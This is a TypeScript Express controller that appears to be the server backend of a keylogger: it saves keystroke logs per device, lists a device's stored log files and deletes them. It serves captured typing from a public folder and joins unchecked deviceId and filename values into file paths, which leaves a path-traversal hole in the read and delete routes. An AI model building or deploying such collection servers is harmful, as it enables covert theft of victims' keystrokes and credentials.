import fs from "fs";
import path from "path";
import { Request, Response } from "express";
import { validationResult } from "express-validator";
import KeyLogs from "../models/keylogs.model";
import { KeyLogsModelType } from "../utils";

// Add New KeyLogs
export const addNewKeyLogs = async (data: any) => {
	try {
		const { deviceId, keyLogsType, keylogs, event } = data;

		const newKeyLog: KeyLogsModelType = new KeyLogs({
			deviceId,
			keyLogsType,
			keylogs: keylogs,
			keyevent: event,
		});

		await newKeyLog.save();

		return { status: 200, message: "Key logs added successfully" };
	} catch (error) {
		console.error("Error adding key logs:", error);
		return { status: 500, error: "Failed to add key logs" };
	}
};

// Add New KeyLogs
// export const addNewKeyLogs = async (data: any) => {
// 	try {
// 		const { deviceId, keyLogsType, keylogs, event } = data;

// 		// Check if keylogs is not an empty string
// 		if (!keylogs || keylogs.trim() === "[]") {
// 			return {
// 				status: 400,
// 				message: "Key logs are empty, nothing to save",
// 			};
// 		}

// 		// Create a username folder if it doesn't exist
// 		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId);
// 		if (!fs.existsSync(logsDir)) {
// 			fs.mkdirSync(logsDir, { recursive: true });
// 		}

// 		// Get today's date in YYYY-MM-DD format for the file name
// 		const today = new Date().toISOString().split("T")[0];
// 		const filePath = path.join(logsDir, `${today}.txt`);

// 		// Format the log entry to only include time (hh:mm:ss)
// 		const formatTime = (date: Date) => {
// 			const hours = String(date.getHours()).padStart(2, "0");
// 			const minutes = String(date.getMinutes()).padStart(2, "0");
// 			const seconds = String(date.getSeconds()).padStart(2, "0");
// 			return `${hours}:${minutes}:${seconds}`;
// 		};

// 		const formattedDate = formatTime(new Date());

// 		// Prepare the log entry with the formatted date
// 		const logEntry = `${formattedDate} - ${keyLogsType}: ${keylogs}, Event: ${event}\n`;

// 		// Append the log entry to the file
// 		fs.appendFileSync(filePath, logEntry);
// 		console.log(`Added new key log entry to: ${filePath}`);
// 	} catch (error) {
// 		console.error("Error adding key logs:", error);
// 		return { status: 500, error: "Failed to add key logs" };
// 	}
// };

// Get Key Logs by DeviceId
export const getKeyLogsFiles = async (req: Request, res: Response) => {
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}

	const { deviceId } = req.params;

	try {
		// Assuming the keylogs are stored in public/keylogs/username
		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId); // Adjust path as needed

		// Check if the directory exists
		if (!fs.existsSync(logsDir)) {
			return res
				.status(404)
				.json({ message: "No logs found for this device" });
		}

		// Read all .txt files in the directory
		const files = fs
			.readdirSync(logsDir)
			.filter((file) => file.endsWith(".txt"));

		// Initialize an array to store the content of each file
		const logs = [];

		// Read the content of each file and push it to the logs array
		for (const file of files) {
			const filePath = path.join(logsDir, file);
			const content = fs.readFileSync(filePath, "utf8");
			logs.push({ filename: file, content });
		}

		// Return the array of logs
		res.status(200).json(logs);
	} catch (error) {
		console.error("Error processing keylogs:", error);
		res.status(500).json({ error: "Failed to process the keylogs" });
	}
};

// Define the base path where keylog files are stored
export const removeKeyLogs = async (req: Request, res: Response) => {
	const errors = validationResult(req);
	if (!errors.isEmpty()) {
		return res.status(400).json({ errors: errors.array() });
	}

	const { deviceId, filename } = req.body;

	const keyLogsBasePath = path.join(
		__dirname,
		"..",
		"..",
		"public",
		"keylogs"
	);

	try {
		// Construct the full path to the keylog file
		const filePath = path.join(keyLogsBasePath, deviceId, filename);

		// Check if the file exists
		if (fs.existsSync(filePath)) {
			// Remove the file
			fs.unlinkSync(filePath);
			return res.status(200).json({
				status: 200,
				message: `${filename} successfully removed`,
			});
		} else {
			return res
				.status(404)
				.json({ status: 404, error: "File not found" });
		}
	} catch (error) {
		console.error("Error removing keylog file:", error);
		return res.status(500).json({ error: "Failed to remove keylog file" });
	}
};
